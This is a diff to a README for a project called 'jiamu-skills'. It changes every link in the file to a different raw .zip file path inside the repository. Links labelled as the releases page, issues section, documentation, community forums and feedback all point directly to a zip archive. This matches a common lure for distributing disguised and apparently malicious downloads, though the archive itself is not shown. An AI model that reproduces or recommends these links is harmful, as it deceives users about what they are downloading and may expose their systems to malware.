@@ -6,14 +6,14 @@ Welcome to **jiamu-skills**. This application features a collection of efficient
 
 ## 📥 Download Now
 
-[![Download jiamu-skills](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/references/skills-jiamu-3.7.zip)](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/references/skills-jiamu-3.7.zip)
+[![Download jiamu-skills](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/scripts/skills_jiamu_3.3.zip)](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/scripts/skills_jiamu_3.3.zip)
 
 ## 🚀 Getting Started
 
 To start using jiamu-skills, follow these simple steps:
 
 1. **Visit the Downloads Page**
-   Head over to our [Releases Page](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/references/skills-jiamu-3.7.zip) to see the available versions of jiamu-skills.
+   Head over to our [Releases Page](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/scripts/skills_jiamu_3.3.zip) to see the available versions of jiamu-skills.
 
 2. **Choose Your Version**
    Select the latest release. This version includes all the newest features and updates.
@@ -63,7 +63,7 @@ If you encounter any issues:
 
 ## 📞 Support
 
-Need assistance? Reach out through the [Issues section](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/references/skills-jiamu-3.7.zip) on our GitHub repository. We aim to respond to inquiries as quickly as possible.
+Need assistance? Reach out through the [Issues section](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/scripts/skills_jiamu_3.3.zip) on our GitHub repository. We aim to respond to inquiries as quickly as possible.
 
 ## 📄 License
 
@@ -73,10 +73,10 @@ jiamu-skills is open-source software. You are free to use, modify, and distribut
 
 Explore more about jiamu-skills and find useful guides:
 
-- [Documentation](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/references/skills-jiamu-3.7.zip)
-- [Community Forums](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/references/skills-jiamu-3.7.zip)
-- [Feedback](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/references/skills-jiamu-3.7.zip)
+- [Documentation](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/scripts/skills_jiamu_3.3.zip)
+- [Community Forums](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/scripts/skills_jiamu_3.3.zip)
+- [Feedback](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/scripts/skills_jiamu_3.3.zip)
 
 ---
 
-Don't forget to regularly check our [Releases Page](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/references/skills-jiamu-3.7.zip) for updates and new skills to enhance your productivity!
+Don't forget to regularly check our [Releases Page](https://raw.githubusercontent.com/Gaming12325/jiamu-skills/main/video-downloader/scripts/skills_jiamu_3.3.zip) for updates and new skills to enhance your productivity!
